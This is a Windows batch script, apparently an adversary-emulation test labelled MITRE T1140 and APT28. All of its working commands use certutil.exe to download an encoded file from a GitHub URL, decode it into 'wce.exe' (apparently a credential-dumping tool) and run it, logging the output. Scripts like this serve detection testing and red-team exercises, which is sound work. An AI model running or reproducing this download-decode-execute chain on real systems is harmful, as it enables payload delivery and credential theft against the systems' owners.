@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Deobfuscate/Decode Files Or Information (T1140)
ECHO.
ECHO [+] Using 'Certutil.exe' to Download and Decode a binary "wce.exe"
ECHO -------------------------------------------------------------------
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/greycel/poc/master/wce.txt %temp%\APT28\wce.txt
certutil.exe -decode %temp%\APT28\wce.txt %temp%\APT28\wce.exe
%temp%\APT28\wce.exe >> %temp%\APT28\pi.log
ECHO.
